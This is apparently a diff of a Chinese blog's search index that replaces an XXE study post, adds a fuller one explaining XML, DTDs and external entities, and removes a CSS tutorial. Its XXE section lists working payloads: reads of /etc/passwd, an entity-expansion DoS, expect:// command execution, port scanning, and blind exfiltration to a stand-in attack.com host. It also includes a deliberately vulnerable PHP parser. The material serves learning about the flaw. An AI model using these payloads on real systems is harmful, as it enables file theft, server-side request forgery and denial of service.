-<h3 id="xxe漏洞简介"><a class="markdownIt-Anchor" href="#xxe漏洞简介"></a> XXE漏洞简介</h3>
-<p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br>
-XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。<br>
-XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
-<p>解析xml在php库libxml，libxml&gt;=2.9.0的版本中没有XXE漏洞</p>
-<h3 id="xxe常见利用方式"><a class="markdownIt-Anchor" href="#xxe常见利用方式"></a> XXE常见利用方式</h3>
-<p>与SQL相似，XXE漏洞也分为有回显和无回显<br>
-有回显，可以直接在页面中看到payload的执行结果或现象。<br>
-无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件。</p>
-<h4 id="读取任意文件"><a class="markdownIt-Anchor" href="#读取任意文件"></a> 读取任意文件</h4>
-<p>首先准备一个有XXE漏洞的文件，这里以php文件为例<br>
-示例代码</p>
-<pre><code class="highlight plaintext">&lt;?php
-$xml = simplexml_load_string($_REQUEST[&#x27;xml&#x27;]);
-print_r($xml);//注释掉该语句即为无回显的情况
-?&gt;</code></pre>
-<p>构造payload</p>
-<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE xxe [
-&lt;!ELEMENT name ANY &gt;
-&lt;!ENTITY file SYSTEM &quot;file:///d://qwzf.txt&quot; &gt;
-]&gt;
-&lt;root&gt;
-&lt;name&gt;&amp;file;&lt;/name&gt;
-&lt;/root&gt;
-或者
-&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE data [
-&lt;!ELEMENT data (#ANY)&gt;
-&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
-]&gt;
-&lt;data&gt;&amp;file;&lt;/data&gt;</code></pre>
-<p>如果搭配vps弹shell的话需要在自己的VPS上写一个dtd</p>
-<pre><code class="highlight plaintext"></code></pre>
-<h4 id="拒绝服务攻击"><a class="markdownIt-Anchor" href="#拒绝服务攻击"></a> 拒绝服务攻击</h4>
-<pre><code class="highlight plaintext">&lt;!DOCTYPE data [
-&lt;!ELEMENT data (#ANY)&gt;
-&lt;!ENTITY a0 &quot;dos&quot; &gt;
-&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
-&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
-]&gt;
-&lt;data&gt;&amp;a2;&lt;/data&gt;</code></pre>
-<p>若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。</p>
-<p>大概的逻辑就是通过嵌套占用服务器的资源，来造成服务器的服务崩溃</p>
-<h4 id="rce"><a class="markdownIt-Anchor" href="#rce"></a> RCE</h4>
-<pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot;?&gt;
-&lt;!DOCTYPE ANY [
-		&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;
-]&gt;
-&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></pre>
-<h4 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h4>
-<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
-&lt;!DOCTYPE xxe [
-&lt;!ELEMENT name ANY &gt;
-&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080“&gt;]&gt;
-&lt;root&gt;
-&lt;name&gt;&amp;xxe;&lt;/name&gt;
-&lt;/root&gt;</code></pre>
-<h4 id="盲注"><a class="markdownIt-Anchor" href="#盲注"></a> 盲注</h4>
-<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
-&lt;!DOCTYPE xxe [
-&lt;!ELEMENT name ANY &gt;
-&lt;!ENTITY xxe SYSTEM &quot;http://attack.com/1.dto“&gt;]&gt;
-&lt;root&gt;
-&lt;name&gt;&amp;xxe;&lt;/name&gt;
-&lt;/root&gt;</code></pre>
-<h4 id="ssrf"><a class="markdownIt-Anchor" href="#ssrf"></a> SSRF</h4>
-<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/&quot; [
-&lt;!ELEMENT data (#ANY)&gt;
-]&gt;
-&lt;data&gt;4&lt;/data&gt;</code></pre>
-<h4 id="x-include"><a class="markdownIt-Anchor" href="#x-include"></a> X-Include</h4>
-<pre><code class="highlight plaintext">&lt;?xml version=&#x27;1.0&#x27;?&gt;
-&lt;data xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;http://publicServer.com/file.xml&quot;&gt;&lt;/xi:include&gt;&lt;/data&gt;</code></pre>
-]]></content>
-      <tags>
-        <tag>-Web</tag>
       </tags>
   </entry>
   <entry>
@@ -7519,6 +7299,226 @@ usleep函数：延迟执行当前脚本数微秒，即条件竞争</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>初见XXE</title>
+    <url>/2025/04/28/%E5%88%9D%E8%A7%81XXE/</url>
+    <content><![CDATA[<h1 id="初见xxe"><a class="markdownIt-Anchor" href="#初见xxe"></a> 初见XXE</h1>
+<p>这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。</p>
+<h2 id="什么是xml呢"><a class="markdownIt-Anchor" href="#什么是xml呢"></a> 什么是XML呢</h2>
+<p>XML，全称<strong>可扩展标记语言</strong>，XML是一种用于存储和传输数据的语言。与HTML一样，XML使用标签和数据的树状结构。但不同的是，XML不使用预定义标记，因此可以为标记指定描述数据的名称。由于json的出现，xml的受欢迎程度大大下降。</p>
+<p>XML文档结构包括XML声明+DTD文档类型定义+文档元素</p>
+<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xml文件的声明--&gt;
+&lt;bookstore&gt;                                                 &lt;!--根元素--&gt;
+&lt;book category=&quot;COOKING&quot;&gt;        &lt;!--bookstore的子元素，category为属性--&gt;
+&lt;title&gt;Everyday Italian&lt;/title&gt;           &lt;!--book的子元素，lang为属性--&gt;
+&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--book的子元素--&gt;
+&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--book的子元素--&gt;
+&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--book的子元素--&gt;
+&lt;/book&gt;                                                 &lt;!--book的结束--&gt;
+&lt;/bookstore&gt;                                       &lt;!--bookstore的结束--&gt;</code></pre>
+<p>其中<code>&lt;note&gt;</code>是根元素，每个XML文档必须包含一个根元素。</p>
+<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。</p>
+<p>standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</p>
+<h3 id="dtd"><a class="markdownIt-Anchor" href="#dtd"></a> DTD</h3>
+<p><strong>DTD基本概念</strong><br>
+XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。<br>
+DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。<br>
+<strong>实体引用</strong><br>
+XML元素以形如 <code>&lt;tag&gt;foo&lt;/tag&gt;</code> 的标签开始和结束，如果元素内部出现如<code>&lt;</code> 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用<code>&lt; &gt; &amp; ' &quot;</code> 替换 <code>&lt; &gt; &amp; ' &quot;</code> 。<br>
+实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。<br>
+<strong>dtd的引入方式</strong><br>
+DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。<br>
+<em>内部 DTD</em><br>
+使用内部的dtd文件，即将约束规则定义在xml文档中</p>
+<pre><code class="highlight plaintext">&lt;!DOCTYPE 根元素名称 [元素声明]&gt;</code></pre>
+<p>示例代码：</p>
+<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;
+&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;
+&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;
+]&gt;
+&lt;note&gt;
+&lt;to&gt;Y0u&lt;/to&gt;
+&lt;from&gt;@re&lt;/from&gt;
+&lt;head&gt;v3ry&lt;/head&gt;
+&lt;body&gt;g00d!&lt;/body&gt;
+&lt;/note&gt;</code></pre>
+<p><em>外部 DTD</em><br>
+（1）引入外部的dtd文件</p>
+<pre><code class="highlight plaintext">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;</code></pre>
+<p>（2）使用外部的dtd文件(网络上的dtd文件)</p>
+<pre><code class="highlight plaintext">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的URL&quot;&gt;</code></pre>
+<p>当使用外部DTD时，通过如下语法引入：</p>
+<pre><code class="highlight plaintext">&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</code></pre>
+<p>示例代码：</p>
+<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;
+&lt;note&gt;
+&lt;to&gt;Y0u&lt;/to&gt;
+&lt;from&gt;@re&lt;/from&gt;
+&lt;head&gt;v3ry&lt;/head&gt;
+&lt;body&gt;g00d!&lt;/body&gt;
+&lt;/note&gt;</code></pre>
+<p>test.dtd</p>
+<pre><code class="highlight plaintext">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</code></pre>
+<p><strong>PCDATA</strong><br>
+PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。<br>
+被解析的字符数据不应当包含任何<code>&amp;</code>，<code>&lt;</code>，或者<code>&gt;</code>字符，需要用<code>&amp;</code> <code>&lt;</code> <code>&gt;</code>实体来分别替换。<br>
+<strong>CDATA</strong><br>
+CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。<br>
+<strong>DTD元素</strong><br>
+<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150727-65e7882a-14d2-1.png" alt="img"><br>
+<strong>DTD属性</strong><br>
+<strong>属性声明语法</strong>：</p>
+<pre><code class="highlight plaintext">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</code></pre>
+<p>DTD实例：</p>
+<pre><code class="highlight plaintext">&lt;!ATTLIST payment Luckey CDATA &quot;Q&quot;&gt;</code></pre>
+<p>XML实例：</p>
+<pre><code class="highlight plaintext">&lt;payment Luckey=&quot;Q&quot; /&gt;</code></pre>
+<p>以下是 属性类型的选项</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150821-85ef2e3e-14d2-1.png" alt="20191202150821-85ef2e3e-14d2-1"></p>
+<p>默认属性值可使用下列值：</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150849-96eb9a7e-14d2-1.png" alt="20191202150849-96eb9a7e-14d2-1"></p>
+<p><strong>DTD实体</strong></p>
+<blockquote>
+<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。<br>
+实体引用是对实体的引用。<br>
+实体可在内部或外部进行声明。</p>
+</blockquote>
+<p><em>按实体有无参分类，实体分为一般实体和参数实体</em><br>
+<em>一般实体的声明</em>：<code>&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;</code><br>
+引用一般实体的方法：<code>&amp;实体名称;</code><br>
+ps：经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。</p>
+<p><em>参数实体的声明</em>：<code>&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;</code><br>
+引用参数实体的方法：<code>%实体名称;</code><br>
+ps：经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。<br>
+DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
+<p><em>按实体使用方式分类，实体分为内部声明实体和引用外部实体</em><br>
+<em>内部实体</em></p>
+<pre><code class="highlight plaintext">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></pre>
+<p>内部实体示例代码：</p>
+<pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE test [
+    &lt;!ENTITY writer &quot;Dawn&quot;&gt;
+    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;
+]&gt;
+&lt;test&gt;&amp;writer;©right;&lt;/test&gt;</code></pre>
+<p><em>外部实体</em><br>
+外部实体，用来引入外部资源。有<code>SYSTEM</code>和<code>PUBLIC</code>两个关键字，表示实体来自本地计算机还是公共计算机。</p>
+<pre><code class="highlight plaintext">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;
+或者
+&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></pre>
+<p>外部实体示例代码：</p>
+<pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE test [
+    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+    &lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;
+]&gt;
+&lt;author&gt;&amp;file;©right;&lt;/author&gt;</code></pre>
+<p>外部实体可支持http、file等协议。不同程序支持的协议不同：<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20191202150935-b26e4a30-14d2-1.png" alt="img"><br>
+PHP支持的协议会更多一些，但需要一定的扩展：<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20191202151023-cf02c3ba-14d2-1.png" alt="img"><br>
+PHP引用外部实体，<strong>常见的利用协议</strong>：</p>
+<pre><code class="highlight plaintext">file://文件绝对路径 如：file:///etc/passwd
+http://url/file.txt
+php://filter/read=convert.base64-encode/resource=xxx.php</code></pre>
+<p><em>参数实体+外部实体</em></p>
+<pre><code class="highlight plaintext">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></pre>
+<p>参数实体+外部实体示例代码：</p>
+<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE test [
+  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+  %file;
+]&gt;</code></pre>
+<p><code>%file</code>(参数实体)是在DTD中被引用的，而<code>&amp;file;</code>是在xml文档中被引用的。</p>
+<h2 id="xml外部实体注入xxe"><a class="markdownIt-Anchor" href="#xml外部实体注入xxe"></a> XML外部实体注入(XXE)</h2>
+<h3 id="xxe漏洞简介"><a class="markdownIt-Anchor" href="#xxe漏洞简介"></a> XXE漏洞简介</h3>
+<p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br>
+XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。<br>
+XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
+<p>解析xml在php库libxml，libxml&gt;=2.9.0的版本中没有XXE漏洞</p>
+<h3 id="xxe常见利用方式"><a class="markdownIt-Anchor" href="#xxe常见利用方式"></a> XXE常见利用方式</h3>
+<p>与SQL相似，XXE漏洞也分为有回显和无回显<br>
+有回显，可以直接在页面中看到payload的执行结果或现象。<br>
+无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件。</p>
+<h4 id="读取任意文件"><a class="markdownIt-Anchor" href="#读取任意文件"></a> 读取任意文件</h4>
+<p>首先准备一个有XXE漏洞的文件，这里以php文件为例<br>
+示例代码</p>
+<pre><code class="highlight plaintext">&lt;?php
+$xml = simplexml_load_string($_REQUEST[&#x27;xml&#x27;]);
+print_r($xml);//注释掉该语句即为无回显的情况
+?&gt;</code></pre>
+<p>构造payload</p>
+<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE xxe [
+&lt;!ELEMENT name ANY &gt;
+&lt;!ENTITY file SYSTEM &quot;file:///d://qwzf.txt&quot; &gt;
+]&gt;
+&lt;root&gt;
+&lt;name&gt;&amp;file;&lt;/name&gt;
+&lt;/root&gt;
+或者
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE data [
+&lt;!ELEMENT data (#ANY)&gt;
+&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;data&gt;&amp;file;&lt;/data&gt;</code></pre>
+<p>如果搭配vps弹shell的话需要在自己的VPS上写一个dtd</p>
+<pre><code class="highlight plaintext"></code></pre>
+<h4 id="拒绝服务攻击"><a class="markdownIt-Anchor" href="#拒绝服务攻击"></a> 拒绝服务攻击</h4>
+<pre><code class="highlight plaintext">&lt;!DOCTYPE data [
+&lt;!ELEMENT data (#ANY)&gt;
+&lt;!ENTITY a0 &quot;dos&quot; &gt;
+&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
+&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
+]&gt;
+&lt;data&gt;&amp;a2;&lt;/data&gt;</code></pre>
+<p>若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。</p>
+<p>大概的逻辑就是通过嵌套占用服务器的资源，来造成服务器的服务崩溃</p>
+<h4 id="rce"><a class="markdownIt-Anchor" href="#rce"></a> RCE</h4>
+<pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+		&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;
+]&gt;
+&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></pre>
+<h4 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h4>
+<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE xxe [
+&lt;!ELEMENT name ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080“&gt;]&gt;
+&lt;root&gt;
+&lt;name&gt;&amp;xxe;&lt;/name&gt;
+&lt;/root&gt;</code></pre>
+<h4 id="盲注"><a class="markdownIt-Anchor" href="#盲注"></a> 盲注</h4>
+<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE xxe [
+&lt;!ELEMENT name ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;http://attack.com/1.dto“&gt;]&gt;
+&lt;root&gt;
+&lt;name&gt;&amp;xxe;&lt;/name&gt;
+&lt;/root&gt;</code></pre>
+<h4 id="ssrf"><a class="markdownIt-Anchor" href="#ssrf"></a> SSRF</h4>
+<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/&quot; [
+&lt;!ELEMENT data (#ANY)&gt;
+]&gt;
+&lt;data&gt;4&lt;/data&gt;</code></pre>
+<h4 id="x-include"><a class="markdownIt-Anchor" href="#x-include"></a> X-Include</h4>
+<pre><code class="highlight plaintext">&lt;?xml version=&#x27;1.0&#x27;?&gt;
+&lt;data xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;http://publicServer.com/file.xml&quot;&gt;&lt;/xi:include&gt;&lt;/data&gt;</code></pre>
+]]></content>
+      <tags>
+        <tag>-Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件上传漏洞</title>
     <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="文件上传漏洞"><a class="markdownIt-Anchor" href="#文件上传漏洞"></a> 文件上传漏洞</h1>
@@ -8549,115 +8549,6 @@ FF83EC5F2C0C8F016A32134589F7B9E97ACBFEFD2EF12A91FA622B38A1449EEB</p>
       </categories>
       <tags>
         <tag>智能合约</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>深度学习网页前端之CSS</title>
-    <url>/2025/03/30/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%BD%91%E9%A1%B5%E5%89%8D%E7%AB%AF%E4%B9%8BCSS/</url>
-    <content><![CDATA[<h1 id="深度学习网页前端之css"><a class="markdownIt-Anchor" href="#深度学习网页前端之css"></a> 深度学习网页前端之CSS</h1>
-<h2 id="写在前面"><a class="markdownIt-Anchor" href="#写在前面"></a> 写在前面</h2>
-<p>你如果问我CSS是什么<s>CSS就是CSS啊</s></p>
-<p>那我可以说，平时浏览网页的主要内容就算由CSS构成的，如果说HTML是骨架，那么CSS就是主要的血肉</p>
-<p>看看菜鸟教程上是怎么解释的:<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250329160026108.png" alt="image-20250329160026108"></p>
-<h2 id="css基础语法"><a class="markdownIt-Anchor" href="#css基础语法"></a> CSS基础语法</h2>
-<p>CSS由两个主要的部分构成:</p>
-<ul>
-<li>选择器 //需要改变样式的HTML元素</li>
-<li>一条或多条说明 //每给说明=1个属性+1个值</li>
-</ul>
-<p>每个属性有一个值。属性和值被冒号分开</p>
-<p>一般都放在head部分的style里</p>
-<p>大概长这个样子</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250329160327242.png" alt="image-20250329160327242"></p>
-<p>css的注释使用经典的/* */</p>
-<h2 id="对于多模块的处理"><a class="markdownIt-Anchor" href="#对于多模块的处理"></a> 对于多模块的处理</h2>
-<p>用过F12的都知道，一个成熟的网页远远不止一种单调的元素，而是能让你眼花缭乱的，这就是通过选择器来进行不同的渲染的</p>
-<h3 id="id-选择器"><a class="markdownIt-Anchor" href="#id-选择器"></a> id 选择器</h3>
-<p>在{}前加上<code>#[选择器名字]</code></p>
-<p>在下面要使用这些属性+值的部分的开始标签加上<code>id=&quot;[选择器名字]&quot;</code></p>
-<p>这样就大功告成了</p>
-<blockquote>
-<p>[!IMPORTANT]</p>
-<p>ID属性不要以数字开头，数字开头的ID在 Mozilla/Firefox 浏览器中不起作用</p>
-</blockquote>
-<h3 id="class选择器"><a class="markdownIt-Anchor" href="#class选择器"></a> class选择器</h3>
-<p>class选择器用于描述一组元素的样式，使用经典款前后闭合</p>
-<p>head部分:.</p>
-<pre><code class="highlight css">.<span class="selector-attr">[选择器名字]</span>&#123;
-属性与值
-&#125;</code></pre>
-<p>body部分:</p>
-<pre><code class="highlight css">&lt;<span class="selector-tag">div</span> class=&quot;<span class="selector-attr">[选择器名称]</span>&quot;&gt;
-
-&lt;/<span class="selector-tag">div</span>&gt;</code></pre>
-<h2 id="css的插入"><a class="markdownIt-Anchor" href="#css的插入"></a> CSS的插入</h2>
-<p>CSS的插入方式有三种</p>
-<ul>
-<li>外部样式表</li>
-<li>内部样式表</li>
-<li>内联样式</li>
-</ul>
-<h3 id="外部样式表"><a class="markdownIt-Anchor" href="#外部样式表"></a> 外部样式表</h3>
-<p>就和图片差不多，从服务器的目录下引入样式表</p>
-<pre><code class="highlight html"><span class="comment">&lt;!-- html内 --&gt;</span>
-<span class="tag">&lt;<span class="name">head</span>&gt;</span>
-<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span>
-<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
-<pre><code class="highlight css"><span class="comment">/*CSS文件内*/</span>
-hr &#123;<span class="attribute">color</span>:sienna;&#125;
-<span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;
-<span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;/images/back40.gif&quot;</span>);&#125;</code></pre>
-<p>浏览器会从css文件中读取样式声明，并根据声明来格式文档</p>
-<blockquote>
-<p>用作外部表的CSS文件不能包含任何的 html 标签</p>
-</blockquote>
-<p>不要属性值和单位之间留空格:如 <code>margin-left: 20 px</code>应该写为<code>margin-left: 20px</code></p>
-<h3 id="内部样式表"><a class="markdownIt-Anchor" href="#内部样式表"></a> 内部样式表</h3>
-<p>单个文档需要特殊样式时，就使用内部样式表：</p>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span>
-<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span>
-<span class="language-css">hr &#123;<span class="attribute">color</span>:sienna;&#125;</span>
-<span class="language-css"><span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;</span>
-<span class="language-css"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;images/back40.gif&quot;</span>);&#125;</span>
-<span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>
-<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
-<h3 id="内联样式"><a class="markdownIt-Anchor" href="#内联样式"></a> 内联样式</h3>
-<p>由于要将表现和内容混杂在一起，内联样式会损失掉样式表的许多优势。请慎用这种方法，例如当样式仅需要在一个元素上应用一次时。</p>
-<p>要使用内联样式，你需要在相关的标签内使用样式（style）属性。Style 属性可以包含任何 CSS 属性。本例展示如何改变段落的颜色和左外边距：</p>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:sienna;margin-left:20px&quot;</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>
-<h3 id="样式的继承"><a class="markdownIt-Anchor" href="#样式的继承"></a> 样式的继承</h3>
-<p>如果某些属性在不同的样式表中被同样的选择器定义，那么属性值将从更具体的样式表中被继承过来。</p>
-<p>例如，外部样式表拥有针对 h3 选择器的三个属性：</p>
-<pre><code class="highlight css"><span class="selector-tag">h3</span> &#123;  <span class="attribute">color</span>:red;    <span class="attribute">text-align</span><span class="selector-pseudo">:left</span>;    <span class="attribute">font-size</span>:<span class="number">8pt</span>; &#125;</code></pre>
-<p>而内部样式表拥有针对 h3 选择器的两个属性：</p>
-<pre><code class="highlight css"><span class="selector-tag">h3</span> &#123;    <span class="attribute">text-align</span><span class="selector-pseudo">:right</span>;    <span class="attribute">font-size</span>:<span class="number">20pt</span>; &#125;</code></pre>
-<p>假如拥有内部样式表的这个页面同时与外部样式表链接，那么 h3 得到的样式是：</p>
-<pre><code class="highlight plaintext">color:red; text-align:right; font-size:20pt;</code></pre>
-<p>即颜色属性将被继承于外部样式表，而文字排列（text-alignment）和字体尺寸（font-size）会被内部样式表中的规则取代。</p>
-<hr>
-<p>样式的优先级为:</p>
-<p><strong>（内联样式）Inline style &gt; （内部样式）Internal style sheet &gt;（外部样式）External style sheet &gt; 浏览器默认样式</strong></p>
-<blockquote>
